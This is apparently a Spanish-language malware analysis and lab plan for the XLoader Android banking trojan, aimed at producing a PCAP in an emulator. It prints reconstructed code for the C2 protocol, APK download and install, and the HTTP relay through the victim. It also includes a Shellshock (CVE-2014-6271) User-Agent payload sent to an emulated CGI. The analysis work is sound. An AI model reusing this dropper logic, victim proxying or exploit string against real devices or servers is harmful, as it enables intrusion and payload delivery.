+    pkgCheckScheduled.set(true);
+    handler.postDelayed(new FirstPkgCheck(), 5000L);
+}
+sendHello();
+
+public final void checkPackages() {
+    if (installDialog == null || !installDialog.isShowing()) {
+        peer.call("getPkgMap", new Boolean[]{ Boolean.valueOf(hasBankPackage()) })
+            .subscribe(new PackageMapHandler(), errorHandler);
+    }
+    handler.postDelayed(new NextPkgCheck(), 500000L);
+}
+```
+
+La llamada `getPkgMap` lleva un `id` incremental y un único parámetro booleano. Para calcularlo, XLoader comprueba si el dispositivo contiene alguna de las diez aplicaciones bancarias identificadas por estos nombres de paquete:
+
+- `com.wooribank.pib.smart`
+- `com.kbstar.kbbank`
+- `com.ibk.neobanking`
+- `com.sc.danb.scbankapp`
+- `com.shinhan.sbanking`
+- `com.hanabank.ebk.channel.android.hananbank`
+- `nh.smart`
+- `com.epost.psf.sdsi`
+- `com.kftc.kjbsmb`
+- `com.smg.spbs`
+
+Esta lista no identifica las APK que el C2 va a transferir; solo determina el booleano comunicado en `getPkgMap`. Como ninguna de esas aplicaciones se instalará en el emulador del laboratorio, el valor será `false` y `params` aparecerá como la matriz MessagePack `[false]`.
+
+```text
+Cliente a C2:
+map {"jsonrpc": "2.0", "method": "getPkgMap", "id": pm,
+     "params": array [false]}
+```
+
+La respuesta utiliza dos niveles de MessagePack. El nivel exterior es la respuesta RPC normal; dentro de su campo `result` hay una matriz cuyo primer elemento es un bloque binario. Ese bloque no contiene todavía la APK: contiene un segundo objeto MessagePack. Al desempaquetarlo aparece un mapa en el que cada clave es el nombre del paquete nuevo y cada valor indica el paquete que debería sustituir, o `*` cuando no hay que sustituir ninguno. Para la futura captura se usará el dato controlado `{"lab.xloader.secondary": "*"}` en ese mapa interior.
+
+```java
+Object binary = ((Object[]) result)[0];
+MapValue packageMap = MessagePack
+    .newDefaultUnpacker((byte[]) binary)
+    .unpackValue()
+    .asMapValue();
+
+for (Map.Entry<Value, Value> entry : packageMap.entrySet()) {
+    String newPackage = entry.getKey().asStringValue().asString();
+    String oldPackage = entry.getValue().asStringValue().asString();
+
+    if (downloadActive || installed.contains(newPackage)
+        || (!"*".equals(oldPackage) && !installed.contains(oldPackage))) {
+        continue;
+    }
+    requestPackageData(newPackage, oldPackage);
+    return;
+}
+```
+
+La respuesta que debe construir el C2 emulado se interpreta en dos niveles:
+
+```text
+Nivel interior, serializado primero:
+map {"lab.xloader.secondary": "*"}
+
+Nivel exterior, enviado como carga RPC:
+map {"jsonrpc": "2.0", "id": pm,
+     "result": array [bin(<bytes MessagePack del mapa interior>)]}
+```
+
+La muestra recorre el mapa y toma la primera entrada elegible. No descarga si ya hay otra descarga activa, si el paquete nuevo figura en el inventario o si el valor anterior no es `*` y ese paquete anterior no está instalado. El orden de un mapa no debe utilizarse para provocar varias instalaciones; la respuesta prevista para el PCAP solo incluirá una entrada.
+
+#### Solicitud `getPkgData`, escritura e instalación
+
+La ruta se forma con `Environment.getExternalStorageDirectory().getPath() + "/.update2/"`. El archivo queda, por tanto, en `<almacenamiento_externo>/.update2/lab.xloader.secondary.apk`, normalmente equivalente a `/sdcard/.update2/lab.xloader.secondary.apk`. Si ya existe, el cliente no pide los datos y pasa al diálogo; la limpieza de `/.update2/` realizada durante el arranque permite que la primera comprobación continúe hasta `getPkgData`.
+
+```java
+String updateDirectory =
+    Environment.getExternalStorageDirectory().getPath() + "/.update2/";
+File file = new File(updateDirectory + newPackage + ".apk");
+```
+
+El cliente activa su indicador de descarga y envía `getPkgData` con `params: ["lab.xloader.secondary"]`. La respuesta debe llevar como `result` una matriz cuyo elemento 0 sea un valor binario con todos los bytes de la APK. No hay descarga HTTP independiente: los bytes están anidados en MessagePack y viajan en una o varias tramas binarias del canal C2. Al recibirlos, el cliente los escribe, cierra el archivo y desactiva el indicador.
+
+```java
+downloadActive = true;
+peer.call("getPkgData", new String[]{ newPackage }).subscribe(result -> {
+    byte[] apk = (byte[]) ((Object[]) result)[0];
+    FileOutputStream output = new FileOutputStream(file);
+    output.write(apk);
+    output.close();
+    downloadActive = false;
+}, error -> {
+    downloadActive = false;
+});
+```
+
+```text
+Cliente a C2:
+map {"jsonrpc": "2.0", "method": "getPkgData", "id": pd,
+     "params": array ["lab.xloader.secondary"]}
+
+C2 a cliente:
+map {"jsonrpc": "2.0", "id": pd,
+     "result": array [bin(<APK completa>)]}
+```
+
+La respuesta del C2 incluirá la APK completa en el bloque binario de `result`. La biblioteca aplicará automáticamente la longitud extendida de RFC 6455 que corresponda al tamaño de la carga; la división posterior entre segmentos TCP no debe fijarse como parte del formato lógico. La evidencia de T1407 será esta transferencia binaria dentro del canal C2, no una descarga HTTP independiente.
+
+A continuación crea un diálogo no cancelable como ventana de superposición del sistema; el valor interno de tipo de ventana es 2003. Tanto el botón negativo como el positivo llaman al mismo procedimiento, por lo que ambos continúan con la instalación. Como el mapa controlado usa `*`, no solicita una desinstalación previa. Si se anunciara un paquete anterior realmente instalado, Android recibiría la acción `ACTION_DELETE` para ese paquete y el malware esperaría el evento `PACKAGE_REMOVED` antes de continuar.
+
+La instalación se solicita al sistema Android mediante un `Intent`: usa la acción `ACTION_VIEW`, una URI local creada con `Uri.fromFile(archivo)`, el tipo MIME de una APK y `FLAG_ACTIVITY_NEW_TASK`. Este paso es local, abre la interfaz del instalador y requiere la confirmación del usuario, además del permiso para instalar desde esa fuente cuando la versión de Android lo exija. El cliente espera después el evento `PACKAGE_ADDED`, que Android emite cuando el paquete nuevo queda instalado.
+
+```java
+Intent intent = new Intent();
+intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+intent.setAction(Intent.ACTION_VIEW);
+intent.setDataAndType(
+    Uri.fromFile(file),
+    "application/vnd.android.package-archive"
+);
+context.startActivity(intent);
+```
+
+1. Elimina el archivo APK descargado.
+2. Obtiene `getLaunchIntentForPackage("lab.xloader.secondary")`.
+3. Añade `FLAG_ACTIVITY_NEW_TASK`.
+4. Inicia la aplicación si existe el intento de lanzamiento.
+
+El análisis estático identifica T1407 en la cadena `getPkgMap`, `getPkgData`, escritura e instalación. En la futura captura, la técnica quedará cubierta en red cuando el PCAP contenga los bytes de la APK dentro de la respuesta C2; la escritura, la entrada al instalador y el lanzamiento aportarán la confirmación local de que esa transferencia produjo el efecto previsto. El tráfico que genere después la APK inocua queda fuera del flujo.
+
+### Relé HTTP, T1604 y T1428
+
+Durante el arranque, XLoader registra `http` como un método que el C2 puede invocar. Al recibir esa orden, el teléfono actúa como intermediario: realiza una nueva solicitud HTTP hacia la URL indicada por el servidor y devuelve el resultado por el canal C2. El manejador recibe cuatro parámetros, en este orden:
+
+1. URL de destino como cadena.
+2. Método HTTP como cadena.
+3. Mapa de cabeceras; cada valor debe ser una matriz.
+4. Cuerpo como `byte[]`.
+
+El alta del manejador y su implementación enlazan directamente la orden C2 con una nueva conexión HTTP originada por el dispositivo:
+
+```java
+peer.register("http", httpHandler);
+
+HttpURLConnection connection =
+    (HttpURLConnection) new URL(url).openConnection();
+connection.setUseCaches(false);
+connection.setRequestMethod(method);
+connection.setInstanceFollowRedirects(true);
+
+for (Map.Entry entry : headers.entrySet()) {
+    for (Object value : (Object[]) entry.getValue()) {
+        connection.setRequestProperty(
+            (String) entry.getKey(),
+            String.valueOf(value)
+        );
+    }
+}
+
+if (body.length != 0) {
+    connection.getOutputStream().write(body);
+}
+
+int status = connection.getResponseCode();
+Map<String, List<String>> responseHeaders = connection.getHeaderFields();
+InputStream input;
+try {
+    input = connection.getInputStream();
+} catch (Throwable ignored) {
+    input = connection.getErrorStream();
+}
+return new Object[]{ status, responseHeaders, readAll(input) };
+```
+
+Este código implementa un intermediario HTTP de petición y respuesta. No abre un proxy SOCKS ni un túnel TCP genérico: cada orden fija una URL, un método, un mapa de cabeceras y un cuerpo, y produce una sola transacción mediante `HttpURLConnection`. La capacidad resulta suficiente para T1604 porque el servicio de destino recibe una conexión originada por el dispositivo infectado, no por el C2. También permite cubrir T1428 cuando la propia transacción reproduce una petición de explotación compatible con esos cuatro campos.
+
+#### Vulnerabilidad seleccionada para el laboratorio
+
+La explotación elegida es [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271), conocida como Shellshock. Las versiones vulnerables de Bash procesan como una función determinadas cadenas recibidas mediante variables de entorno y ejecutan el texto añadido después de su definición. En un servicio CGI, Apache convierte cabeceras HTTP en variables de entorno antes de iniciar el programa; por ejemplo, `User-Agent` se expone como `HTTP_USER_AGENT`. NVD documenta `mod_cgi` y `mod_cgid` de Apache como vectores de explotación, y las [reglas de mitigación de Red Hat](https://access.redhat.com/articles/1212303) detectan en las cabeceras el comienzo de una definición de función de Bash.
+
+La vulnerabilidad encaja con las restricciones de XLoader: solo requiere una petición HTTP a un CGI y una cabecera controlada. No necesita transportar un protocolo distinto de HTTP, conservar una conexión interactiva ni emitir bytes que `HttpURLConnection` no pueda representar. El [módulo `http-shellshock` de Nmap](https://github.com/nmap/nmap/blob/master/scripts/http-shellshock.nse) antepone una definición de función vacía al comando y permite insertar el vector completo en `User-Agent`; la petición elegida conserva esa misma estructura pública. Para la futura captura, `vuln.lab` representará un servicio interno accesible desde el dispositivo infectado. Su emulador reconocerá la secuencia completa, pero no invocará Bash ni ejecutará comandos en el equipo del laboratorio.
+
+Por tanto, la petición relacionada con la vulnerabilidad seleccionada para el laboratorio utilizará `GET http://vuln.lab/cgi-bin/status`, un cuerpo vacío y el siguiente valor de `User-Agent`:
+
+```text
+() { :;}; echo; /usr/bin/id
+```
+
+La parte `() { :;}` tiene la forma de una definición de función aceptada por las versiones vulnerables de Bash. El texto situado después de `};` contiene el comando que se ejecutaría al importar la variable; `echo` separa la salida CGI y `/usr/bin/id` produce un resultado breve y reconocible.
+
+La orden del C2 tendrá esta forma lógica después de desempaquetar MessagePack:
+
+```text
+map {
+  "jsonrpc": "2.0",
+  "method": "http",
+  "id": hp,
+  "params": array [
+    "http://vuln.lab/cgi-bin/status",
+    "GET",
+    map {
+      "User-Agent": array ["() { :;}; echo; /usr/bin/id"]
+    },
+    bin("")
+  ]
+}
+```
+
+El dispositivo ejecuta `new URL(url).openConnection()`, exige que sea `HttpURLConnection`, desactiva la caché, establece el método recibido y activa las redirecciones. Recorre cada matriz de valores y llama repetidamente a `setRequestProperty`; esta función reemplaza el valor anterior, por lo que para una cabecera con varios elementos solo queda efectivo el último. Si el cuerpo tiene longitud distinta de cero, lo escribe en `getOutputStream()`; esa llamada puede activar de forma implícita el modo de salida y cabeceras propias de la plataforma. No se configuran tiempos de conexión ni lectura, de modo que durante la captura el servicio emulado deberá responder sin demora.
+
+Después obtiene el código, `getHeaderFields()` y el flujo de entrada. Si falla el flujo normal, usa `getErrorStream()`. Lee el cuerpo entero y responde al C2, con el mismo `id`, con una matriz `result` formada por:
+
+`[código_entero, mapa_de_cabeceras, cuerpo_byte_array]`
+
+La solicitud generada por el teléfono constituye una segunda conversación de red, separada del C2. En el laboratorio, `HttpURLConnection` añade `Host`, mantiene la conexión como `Keep-Alive` y anuncia soporte para `gzip`. La petición observada tiene esta forma:
+
+```http
+GET /cgi-bin/status HTTP/1.1
+User-Agent: () { :;}; echo; /usr/bin/id
+Host: vuln.lab
+Connection: Keep-Alive
+Accept-Encoding: gzip
+```
+
+El servicio comprueba la ruta y la cabecera exactas. Cuando ambas coinciden, devuelve una respuesta determinista con una firma de servidor coherente con el CGI representado. La fecha cambia en cada ejecución; no se añade ninguna cabecera que identifique el laboratorio ni la vulnerabilidad:
+
+```http
+HTTP/1.1 200 OK
+Server: Apache/2.4.7 (Ubuntu)
+Date: <fecha HTTP>
+Content-Type: text/plain; charset=us-ascii
+Content-Length: 44
+Connection: close
+
+uid=1000(cgi) gid=1000(cgi) groups=1000(cgi)
+```
+
+El dispositivo encapsula el resultado completo y lo devuelve por el primer canal:
+
+```text
+map {"jsonrpc": "2.0", "id": hp,
+     "result": array [200, map {<cabeceras de respuesta>},
+                       bin("uid=1000(cgi) gid=1000(cgi) groups=1000(cgi)")]}
+```
+
+El mapa de respuesta puede contener una clave nula para la línea de estado, comportamiento propio de `HttpURLConnection`. En la futura captura, el nombre `vuln.lab` producirá una consulta DNS y el teléfono abrirá TCP hacia la dirección obtenida.
+
+La misma secuencia proporciona dos evidencias diferenciadas. [T1604, Proxy Through Victim](https://attack.mitre.org/techniques/T1604/) queda reflejada porque el C2 utiliza el dispositivo para alcanzar `vuln.lab` y recibe la respuesta a través del canal C2. [T1428, Exploitation of Remote Services](https://attack.mitre.org/techniques/T1428/) queda reflejada por la cabecera fiel a CVE-2014-6271 y por la respuesta controlada que confirma que el servicio emulado reconoció la explotación.
+
+### Configuración alternativa por SMS
+
+XLoader también puede recibir por SMS una orden de configuración cuyo prefijo es `SI`. Esta es una vía alternativa para sustituir la plantilla de URL, la codificación, la expresión regular y la lista de cuentas persistidas. El código analizado no permite concluir que sea la única forma posible de alterar toda la configuración del malware. Para el laboratorio no se enviará este SMS: los valores predeterminados ya permiten consultar Twitter, seleccionar la cuenta regional y obtener el C2 preparado.
+
+### Secuencia comunicativa
+
+La secuencia muestra los intercambios de red necesarios para las cinco técnicas seleccionadas. El orden relativo de las dos consultas a Twitter y de la apertura del C2 puede variar durante la ejecución; el diagrama adopta un orden nominal para facilitar la lectura. El C2 emulado responderá a cada llamada con el identificador recibido, sin depender de números fijos.
+
+```mermaid
+sequenceDiagram
+    participant APP as Aplicación XLoader
+    participant DNS as Servicio DNS
+    participant TW as Twitter emulado
+    participant WV as WebView
+    participant WEB as Servidor del WebView
+    participant C2 as Servidor C2
+    participant VULN as Servicio CGI vulnerable
+
+    APP->>DNS: Consulta A o AAAA de twitter.com
+    DNS-->>APP: Dirección controlada
+    APP->>TW: HTTPS GET sdfghuio342
+    TW-->>APP: HTTP 200 con título CJK del C2
+    Note over APP,TW: Extrae el título y decodifica host y puerto
+
+    APP->>C2: Conexión TCP al puerto 28833
+    Note over APP,C2: TLS solo si la dirección deriva de ssl
+    Note over APP,C2: No hay GET Upgrade ni respuesta 101
+    APP->>C2: Tramas binarias enmascaradas state y ondbm
+    C2-->>APP: Respuestas con los mismos identificadores
+    APP->>C2: Trama binaria enmascarada con hello
+    C2-->>APP: Trama binaria con result nil
+    APP->>C2: Nueva llamada state y consultas iniciales
+    C2-->>APP: Respuestas con los mismos identificadores
+
+    APP->>TW: HTTPS GET fdgoer343
+    TW-->>APP: HTTP 200 con título CJK de la URL del WebView
+    WV->>DNS: Consulta A o AAAA de webview.lab
+    DNS-->>WV: Dirección controlada
+    WV->>WEB: HTTP GET de la página
+    WEB-->>WV: HTTP 200 con contenido controlado
+
+    APP->>C2: getPkgMap con false
+    C2-->>APP: Mapa de paquetes dentro de binario MessagePack
+    APP->>C2: getPkgData para la APK adicional
+    C2-->>APP: APK completa dentro de binario MessagePack
+
+    C2->>APP: Orden RPC http con vector Shellshock
+    APP->>DNS: Consulta A o AAAA de vuln.lab
+    DNS-->>APP: Dirección controlada
+    APP->>VULN: HTTP GET al CGI con User Agent malicioso
+    Note over APP,VULN: CVE 2014 6271 con comando id
+    VULN-->>APP: HTTP 200 con resultado controlado de id
+    APP-->>C2: Resultado RPC con código cabeceras y cuerpo
+```
+
+### Laboratorio de generación del PCAP
+
+El laboratorio ejecuta la muestra original en un emulador Android API 22 configurado con la región `ko_KR`. Un `Corefile` autosuficiente resuelve `twitter.com`, `webview.lab` y `vuln.lab` hacia `10.0.2.2`; al capturar la interfaz loopback de Windows, las cabeceras IP de esas conversaciones aparecen como `127.0.0.1`. No es necesario instalar una autoridad de certificación: el certificado incluido contiene `twitter.com` en su SAN y la muestra omite la validación de confianza en esta ruta.
+
+El lanzador Python inicia el servicio HTTPS que proporciona ambos títulos CJK, el servidor HTTP del `WebView` y del CGI, y el C2 en `28833/tcp`. El C2 entrega una APK inocua mediante `getPkgData`, se pausa mientras se confirma su instalación y, al continuar, envía la orden `http` que provoca la petición Shellshock y recibe su respuesta por el mismo canal.
+
+Antes de abrir la muestra se fija la región coreana y se reinicia Android para que `Locale.getDefault()` seleccione la rama `ko_KR`:
+
+```powershell
+PS: adb root
+PS: adb wait-for-device
+PS: adb shell setprop persist.sys.language ko
+PS: adb shell setprop persist.sys.country KR
+PS: adb shell stop
+PS: adb shell start
+PS: adb wait-for-device
+```
+
+Una vez que el emulador vuelve a estar disponible, CoreDNS y el lanzador se ejecutan desde la raíz del laboratorio, cada uno en una terminal distinta:
+
+```powershell
+PS: coredns.exe -conf .\coredns\Corefile
+PS: python .\run_lab.py
+```
